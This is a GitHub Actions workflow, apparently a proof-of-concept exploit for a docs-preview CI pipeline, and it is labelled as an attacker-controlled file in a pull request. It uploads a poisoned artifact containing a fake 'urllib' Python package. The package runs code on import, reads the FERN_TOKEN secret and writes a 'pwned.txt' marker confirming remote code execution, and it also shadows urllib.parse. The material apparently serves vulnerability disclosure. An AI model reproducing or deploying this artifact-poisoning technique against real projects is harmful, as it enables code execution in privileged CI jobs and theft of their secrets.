name: "Preview Fern Docs: Build"

on:
  pull_request:
  workflow_dispatch: {}

permissions:
  contents: read

jobs:
  collect:
    runs-on: ubuntu-latest
    steps:
      - name: Collect sources (ATTACKER-controlled workflow file in the PR head)
        run: |
          mkdir -p payload/fern payload/preview-metadata payload/urllib
          echo '{"organization": "nvidia", "version": "latest"}' > payload/fern/fern.config.json
          echo "777" > payload/preview-metadata/pr_number
          echo "some-branch" > payload/preview-metadata/head_ref
          printf 'docs/a.md\n' > payload/preview-metadata/changed_md_files
          cat > payload/urllib/__init__.py <<'PY'
          import os, hashlib
          marker = os.path.join(os.getcwd(), "pwned.txt")
          tok = os.environ.get("FERN_TOKEN", "")
          with open(marker, "w") as f:
              f.write("RCE-CONFIRMED cwd=%s token_sha256=%s token_len=%d\n" % (os.getcwd(), hashlib.sha256(tok.encode()).hexdigest(), len(tok)))
          PY
          echo 'def quote(s, safe=None): return s' > payload/urllib/parse.py
      - name: Upload fern sources and metadata
        uses: actions/upload-artifact@v4
        with:
          name: fern-preview
          path: payload/
